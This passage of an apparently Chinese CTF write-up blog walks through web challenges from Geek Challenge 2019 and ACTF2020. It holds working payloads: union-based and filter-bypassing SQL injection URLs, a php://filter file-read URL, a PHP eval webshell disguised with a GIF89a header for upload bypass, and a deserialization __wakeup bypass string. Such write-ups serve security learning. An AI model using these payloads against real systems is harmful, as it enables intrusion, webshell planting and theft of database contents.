src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733867.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过fuzz测试发现;可以使用，所以我们尝试下堆叠注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733873.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现flag，尝试抓取它</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733875.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 但是回显是nonono。到这基本上我就寄了，转去网上找大佬wp学习</p><p>大佬猜测后端是如下代码，有着一个或结构。</p><pre class="line-numbers language-none"><code class="language-none">select $_POST[&#39;query&#39;] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>所以只需要将**$_POST[‘query’]** 变成 ***,1**便可以得到flag 。此时语句会变成</p><p><strong>select *,1 from flag  等同于 1 || flag</strong> 短路语法</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733869.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>二、本题知识点</strong> </p><p>(1)、短路语法</p><blockquote><p>|| 逻辑或的短路也是类似的，a||b</p><p>计算机发现a是真，那么扔a；如果a是假，那么扔b</p><p>a||b， 计算机要么执行a要么执行b。a真执行a，a假执行b。</p></blockquote><p>所以 <strong>select 1 from flag的意思其实是建立一个临时列，这个列的所有初始值都被设为1</strong></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><h3 id="一、本题解题思路-2"><a href="#一、本题解题思路-2" class="headerlink" title="一、本题解题思路"></a>一、本题解题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734210.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 看着这个页面什么也没法得到，所以只能从源代码里面找线索了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734454.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 发现有个php 点击去看看</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734000.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>点击这个SECRET 发现什么都得不到，说我们已经查阅成功没看清，所以可以考虑一下bp抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734961.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以通过BP抓包，果然在其回显中发现线索，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734023.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 打开这个php，发现是一个代码审计</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734012.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 如果傻傻的去访问这个flag.php，那么依旧是什么都得不到</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734008.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 结合这句话和代码审计里面的 input data。很难不让人想到php伪协议，</p><p>所以我们可以构建这个url </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">url+/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到一大串base64编码，解密一下就可以得到flag了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735713.png"><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a><strong>[极客大挑战 2019]LoveSQL</strong></h2><h3 id="一、本题解题思路-3"><a href="#一、本题解题思路-3" class="headerlink" title="一、本题解题思路"></a><strong>一、本题解题思路</strong></h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736443.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">啊，依旧是一道sql注入题，先看看闭合式吧</p><p>发现用1’是有报错，而1”回显错误账号和密码，所以猜测为用’闭合 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736511.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 用联合注入爆破所有数据库</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736319.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">尝试爆该表字段，构造url</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到其中字段</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736152.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以我们在抓取其中字段内容，构造url</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736406.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-3"><a href="#二、本题知识点-3" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>联合查询注入(UNION query SQL injectio)<br>获取所有数据库名：<br>union select 1,2,group_concat(schema_name)  from information_schema.schemata –%20</p><p>获取指定数据库下所有表名：<br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘库名’ –%20</p><p>获取指定表下所有字段名：<br>union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘表名’ –%20</p><p>获取字段内容</p><p>union select 1,2,group_concat(字段1,字段2,字段3) from 表名 –%20</p></blockquote><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h3 id="一、本题做题思路-6"><a href="#一、本题做题思路-6" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>同样的，在主页面什么都找不到，只能从源代码里面找线索咯</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738498.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">点击这个php里面找找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">说我们不是来自这个网站，所以我们可以选择用BP抓一下包，改一下来源</p><p>在BP中添加一个 <strong>Referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738605.png"></p><p>他又说我们没用这个Syclover浏览器访问，那我们再改一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041739672.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 又说我们必须本地来读取它，通过加入XFF得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041739692.png"></p><h3 id="二、本题知识点-4"><a href="#二、本题知识点-4" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p> X-Forwarded-For  (XFF) 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p><p>Rerferer: url 代表用所需的网站进行访问</p><p>User-Agent: 代理浏览器</p></blockquote><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><h3 id="一、本题做题思路-7"><a href="#一、本题做题思路-7" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开这个网页就直接给出了提示，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740442.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">放入蚁剑里，通过所POST的作为密码从而连接进入这个网站</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740430.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 然后成功添加后，用其虚拟终端输入 <strong>cat &#x2F;flag</strong> 得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740419.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h3 id="一、本题做题思路-8"><a href="#一、本题做题思路-8" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>上传题，先上传个php文件看看回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看来没戏，尝试用图片绕过，然后BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741781.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 发现其还会对图片内容进行读取，所以我们需要修改图片里的内容，将里面的一句话木马换种方式书写，将其修改为如下代码。</p><pre class="line-numbers language-none"><code class="language-none">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还是不行，又出现一个新的回显， <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742216.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到了这步就要用到一个新的东西，即<strong>文件幻术头绕过</strong>，详情可看这位<a href="https://blog.csdn.net/since_2020/article/details/119414380">大佬博客</a>来进行了解</p><p>总之就是要在上面所述代码内容上面再添加图片文件头(十六进制转换为的字符)</p><pre class="line-numbers language-none"><code class="language-none">GIF89a&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">回显虽然是上传成功，但是无法从蚁剑内连接进入，通过BP将其后缀修改为.phtml（这里如果你把后缀改成.php7 虽然绕过他对php的检查，但是没法蚁剑连接不进去，也可能是我自己的问题。）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742189.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">构造payload   <strong>url+&#x2F;upload&#x2F;xxxx.phtml</strong> 放入蚁剑内连接进入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742206.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后跟上题一样，打开虚拟终端  <strong>cat &#x2F;flag</strong>  得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742184.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-5"><a href="#二、本题知识点-5" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>(1)、文件上传后缀绕过，这在打upload-labs靶场时就能积累一些，例如大小写绕过.Php等<strong>。&#x2F;&#x2F;<strong>空格绕过xxx. php等</strong>。&#x2F;&#x2F;</strong>::$DATA，在windows php里面，文件名后加入此字符，系统会将此文件当文件流处理，不会检测其后缀名<strong>。&#x2F;&#x2F;<strong>双写绕过，例如xxx.pphphp等</strong>。&#x2F;&#x2F;</strong>%00截断，这个好像要考虑php版本。</p><p>(2)、文件幻术头绕过，如上面所说，可以去看那位大佬的博客了解一下。</p></blockquote><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><h3 id="一、本题做题思路-9"><a href="#一、本题做题思路-9" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743773.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>当你把鼠标移到灯泡的时候就会发现其实是一个上传题，所以老规矩先看看php回显不。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743760.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以我们还是需要上传图片然后再通过BP抓包进行修改。发现回显显示上传成功 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743771.png"> 不过我们还需要在BP里将.jpg修改为.phtml。同样修改为php7虽然能绕过其对php的过滤，但是没法连接进入。</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744518.png">所以在网站后面加入这个后缀就可以连接进去了，老样子，打开虚拟终端，输入代码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744414.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="一、本题做题思路-10"><a href="#一、本题做题思路-10" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>先看看它是什么闭合方式，通过对比，发现其还是由’闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744401.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744416.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑fuzz测试，发现过滤字符，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744443.png">尝试双写绕过，先看看有几个字段</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; oorrder bbyy 4 --+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745244.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">用三回显不同，所以有三个字段，判断一下注入点</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,3 --+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745204.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现回显为在第二个字段和第三个字段。来查询一下它里面所有的库</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑 再接下来就是查询表中字段咯，和上面一道sql题一样，不过这次要双写绕过。</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name&#x3D;&#39;Flag&#39;--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746538.png"></p><p> 再查询一下字段中的内容</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(flag) frfromom ctf.Flag--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746488.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><h3 id="一、本题做题思路-11"><a href="#一、本题做题思路-11" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041748182.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看网上大佬WP这道题是有个猫的，不过我的不知道为什么没刷出来，不过无伤大雅</p><p>按照所给提示，有备份的好习惯，可以扫描目录得到<a href="http://www.zip(可以通过python脚本扫描或者通过kali上dirb工具,记得找个字典.)/">www.zip(可以通过python脚本扫描或者通过kali上Dirb工具，记得找个字典。)</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041748172.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 源代码可以看这位 <a href="https://blog.csdn.net/weixin_46685211/article/details/116395600?spm=1001.2014.3001.5502">大佬的博客</a></p><p>得到一个压缩包，里面有着其源代码 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041749855.png"></p><p>查询一番能得到的线索从class.php和index.php得到</p><p><strong>class.php</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123;    private $username &#x3D; &#39;nonono&#39;;    private $password &#x3D; &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function __wakeup()&#123;        $this-&gt;username &#x3D; &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password !&#x3D; 100) &#123;            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;            die();        &#125;        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>index.php</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php   include &#39;class.php&#39;;   $select &#x3D; $_GET[&#39;select&#39;];   $res&#x3D;unserialize(@$select);   ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过class.php里的__construct，__wakeup,__destruct函数可以判断index.php中的反序列化存在漏洞。先通过class.php的内容构建一个反序列化,构造后的结果如下图。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041750938.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">修改前 O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;修改后 O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;修改前O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D修改后O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在class.php里，要满足username&#x3D;admin 和 password&#x3D;100从而满足得到flag的条件，而在index.php里，我们知道get传参传的是 <strong>select 。</strong>但<strong>select</strong>要被反序列化才行。而为什么还需要使用<strong>urlencode</strong>对序列化后的**$b<strong>进行，</strong>是因为private序列化后的特使字符如果不使用字符表示会无法显示出来。而当当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字。**</p><p>最后再使用select传参得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041752862.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-6"><a href="#二、本题知识点-6" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>__construct()：创建对象时初始化，当一个对象创建时被调用<br> __wakeup() 使用unserialize时触发<br> __sleep() 使用serialize时触发<br> __destruction()：结束时销毁对象，当一个对象销毁时被调用</p></blockquote><p><strong>对由private定义的，尽量使其用字符转化一下，相较于public，private产生的特使字符无法正常显示出来。</strong></p><p><strong>绕过______wakeup() 当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字</strong>。</p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="一、本题做题思路-12"><a href="#一、本题做题思路-12" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>这题光靠打开页面什么也得不到，只能通过题目得到提示，然后对网站后缀进行搜索找到备份网站。</p><p>通过dirsearch找到备份网站为<strong>url+&#x2F;index.php,bak。</strong>得到一个文件，打开后发现是代码审计</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) &#123;    $key &#x3D; $_GET[&#39;key&#39;];&#x2F;&#x2F;$key&#x3D;key    if(!is_numeric($key)) &#123;        exit(&quot;Just num!&quot;);&#x2F;&#x2F;判断$key是不是数字。    &#125;    $key &#x3D; intval($key);    $str &#x3D; &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key &#x3D;&#x3D; $str) &#123;        echo $flag;  $key弱等于字符串$str    &#125;&#125;else &#123;    echo &quot;Try to find out source file!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></blockquote><p>所以就需要$key是数字，且能等于$str,因为是弱等于，所以可以构造<strong>payload: url+&#x2F;?key&#x3D;123</strong></p><p><strong>得到flag</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041754498.png"><img 